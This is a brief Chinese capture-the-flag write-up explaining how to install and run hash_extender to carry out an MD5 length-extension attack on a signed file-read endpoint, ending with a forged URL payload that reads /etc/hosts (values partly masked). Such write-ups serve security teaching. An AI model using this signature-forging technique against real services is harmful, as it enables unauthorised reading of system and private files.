9.有签名限制的读取任意文件
url：
http://xxx.xxx.xxx/md5_le.php
根据提示本题需要MD5长度扩展攻击
本题我们使用的工具是hash_extender，推荐使用Ubuntu进行安装
git clone https://github.com/iagox86/hash_extendersudo apt-get install g++ libssl-devcd hash_extendermake
编译安装完成之后就可以继续了
./hash_extender -f md5 -l 32 -d '/etc/hosts' -s 'f3d3661386xxxx4fc15731692e' -a '' --out-data-format=html
-d 原始数据
-f 代表加密方式
-l key的长度
-s 原始的hash值
-a 添加的值
--out-data-format 输出的格式
组合一下New string和New signature
最后payload如下
md5_le.php?filepath=%2fetc%2fhosts%80%00%00%00%00%00%00%00%00%0xxxxx0%00P%01%00%00%00%00%00%00&sign=1b17d9594exxxxx90b11660ac63
得到Flag
